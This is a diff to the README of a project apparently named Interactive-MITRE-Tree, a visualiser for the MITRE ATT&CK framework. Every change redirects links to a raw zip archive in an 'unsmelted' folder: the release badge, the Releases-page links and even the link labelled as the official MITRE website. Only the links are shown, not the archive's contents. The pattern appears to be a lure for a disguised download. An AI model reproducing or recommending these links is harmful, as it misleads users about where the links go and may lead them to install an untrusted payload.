@@ -1,6 +1,6 @@
 # 🌲🔍 Interactive-MITRE-Tree - Visualize MITRE Attack Framework Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-green.svg)](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip%20Latest%https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip)](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the Interactive MITRE Tree! This tool helps you visualize the MITRE A
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Releases](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip).
 
-1. Go to the [Releases page](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip).
 2. Find the latest version of the application.
 3. Click on the file that matches your operating system (Windows, Mac, or Linux).
 4. Download the file.
@@ -62,6 +62,6 @@ If you need assistance or have questions, you can reach out through the Issues s
 
 ## 📚 References
 
-For more information on the MITRE ATT&CK Framework, visit the official MITRE website: [MITRE ATT&CK](https://attack.mitre.org/).
+For more information on the MITRE ATT&CK Framework, visit the official MITRE website: [MITRE ATT&CK](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip).
 
-Thank you for using the Interactive MITRE Tree! We hope it helps you learn more about cybersecurity in an engaging way. For updates, features, and future releases, keep an eye on our [Releases page](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
+Thank you for using the Interactive MITRE Tree! We hope it helps you learn more about cybersecurity in an engaging way. For updates, features, and future releases, keep an eye on our [Releases page](https://raw.githubusercontent.com/chrisgallenx/Interactive-MITRE-Tree/main/unsmelted/Interactive-MITRE-Tree.zip).
